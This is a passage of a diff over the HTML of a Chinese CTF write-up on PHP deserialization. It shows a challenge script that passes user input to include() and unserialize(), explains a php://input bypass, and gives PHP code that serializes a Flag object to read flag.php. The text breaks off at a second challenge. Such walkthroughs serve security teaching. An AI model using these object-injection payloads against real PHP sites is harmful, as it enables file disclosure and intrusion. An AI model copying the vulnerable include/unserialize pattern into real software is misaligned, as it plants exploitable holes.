-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;preg_match&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/flag/&amp;#34;&lt;/span&gt;, $file)){
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;exit&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;不能现在就给你flag哦&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;{
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;include&lt;/span&gt;($file);
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        $password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;unserialize&lt;/span&gt;($password);
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; $password;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;} &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;you are not the member of us!&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;lt;br&amp;gt;&amp;#34;&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;show_source&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;__FILE__&lt;/span&gt;);
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;!-- hint.php --&amp;gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$txt &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_GET[&lt;span style="color:#e6db74"&gt;&amp;#34;txt&amp;#34;&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$file &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_GET[&lt;span style="color:#e6db74"&gt;&amp;#34;file&amp;#34;&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$password &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_GET[&lt;span style="color:#e6db74"&gt;&amp;#34;password&amp;#34;&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($txt) &lt;span style="color:#f92672"&gt;&amp;amp;&amp;amp;&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;file_get_contents&lt;/span&gt;($txt, &lt;span style="color:#e6db74"&gt;&amp;#39;r&amp;#39;&lt;/span&gt;) &lt;span style="color:#f92672"&gt;===&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;welcome to the ctf&amp;#34;&lt;/span&gt;)){
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;hello friends!&amp;#39;&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\n&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;preg_match&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;/flag/&amp;#34;&lt;/span&gt;, $file)){
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;        &lt;span style="color:#66d9ef"&gt;exit&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;不能现在就给你flag哦&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\n&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    }&lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;        &lt;span style="color:#66d9ef"&gt;include&lt;/span&gt;($file);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;        $password &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;unserialize&lt;/span&gt;($password);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;        &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; $password;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;} &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;you are not the member of us!&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\n&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;lt;br&amp;gt;&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    &lt;span style="color:#a6e22e"&gt;show_source&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;__FILE__&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;?&amp;gt;&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&amp;lt;!-- hint.php --&amp;gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;分析代码可见需要&lt;code&gt;$txt&lt;/code&gt;变量赋值并且值需要等于&lt;code&gt;welcome to the ctf&lt;/code&gt;,因为函数&lt;code&gt;file_get_contents&lt;/code&gt;支持&lt;code&gt;php://input&lt;/code&gt;协议，所以可以被绕过。&lt;/p&gt;
 &lt;p&gt;然后是&lt;code&gt;$file&lt;/code&gt;变量不能够包含&lt;code&gt;flag&lt;/code&gt;字符串。&lt;/p&gt;
 &lt;p&gt;最后是可包含一个文件，一个反序列化操作，这里的&lt;code&gt;echo&lt;/code&gt;熟悉的朋友能看出来这是&lt;code&gt;toString&lt;/code&gt;魔法函数的可能性很大。&lt;/p&gt;
 &lt;p&gt;hint.php&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Flag&lt;/span&gt;{&lt;span style=&#34;color:#75715e&#34;&gt;//flag.php
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; $file;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __toString(){
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;file&lt;/span&gt;)){
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;file_get_contents&lt;/span&gt;($this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;file&lt;/span&gt;);
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; success!&amp;#34;&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;good&amp;#34;&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;show_source&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;__FILE__&lt;/span&gt;);
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Flag&lt;/span&gt;{&lt;span style="color:#75715e"&gt;//flag.php
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt;    &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; $file;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; __toString(){
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;        &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;file&lt;/span&gt;)){
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;            &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;file_get_contents&lt;/span&gt;($this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;file&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;            &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\n&lt;/span&gt;&lt;span style="color:#e6db74"&gt; success!&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;            &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;good&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;show_source&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;__FILE__&lt;/span&gt;);
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;因为包含了&lt;code&gt;hint.php&lt;/code&gt;，所以可以创建以下测试文件输出序列化字符串，再进行反序列化的时候，&lt;code&gt;$file&lt;/code&gt;变量会变成&lt;code&gt;flag.php&lt;/code&gt;，这样就能直接输出flag的值了。&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Flag&lt;/span&gt;{&lt;span style=&#34;color:#75715e&#34;&gt;//flag.php
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; $file &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;flag.php&amp;#34;&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __toString(){
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;file&lt;/span&gt;)){
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;file_get_contents&lt;/span&gt;($this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;file&lt;/span&gt;);
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;good&amp;#34;&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Flag&lt;/span&gt;();
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;serialize&lt;/span&gt;($a);
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-21-16-35-48.png&#34;
-	width=&#34;1031&#34;
-	height=&#34;436&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-21-16-35-48_hu0eaef9be15de1dc4443280970161703b_40962_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-21-16-35-48_hu0eaef9be15de1dc4443280970161703b_40962_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Flag&lt;/span&gt;{&lt;span style="color:#75715e"&gt;//flag.php
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt;    &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; $file &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;flag.php&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; __toString(){
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;        &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;file&lt;/span&gt;)){
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;            &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;file_get_contents&lt;/span&gt;($this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;file&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;            &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\n&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;            &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;good&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$a &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Flag&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;serialize&lt;/span&gt;($a);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-21-16-35-48.png"
+	width="1031"
+	height="436"
+	srcset="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-21-16-35-48_hu0eaef9be15de1dc4443280970161703b_40962_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-21-16-35-48_hu0eaef9be15de1dc4443280970161703b_40962_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;236&#34;
-		data-flex-basis=&#34;567px&#34;
+		class="gallery-image" 
+		data-flex-grow="236"
+		data-flex-basis="567px"
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-21-16-36-17.png&#34;
-	width=&#34;1272&#34;
-	height=&#34;681&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-21-16-36-17_hu95f03caaed6e0a11fd83c4533aad02d0_150206_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-21-16-36-17_hu95f03caaed6e0a11fd83c4533aad02d0_150206_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-21-16-36-17.png"
+	width="1272"
+	height="681"
+	srcset="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-21-16-36-17_hu95f03caaed6e0a11fd83c4533aad02d0_150206_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-21-16-36-17_hu95f03caaed6e0a11fd83c4533aad02d0_150206_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;186&#34;
-		data-flex-basis=&#34;448px&#34;
+		class="gallery-image" 
+		data-flex-grow="186"
+		data-flex-basis="448px"
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;再看一题&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;foo&lt;/span&gt;{
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; $file &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2.txt&amp;#34;&lt;/span&gt;;
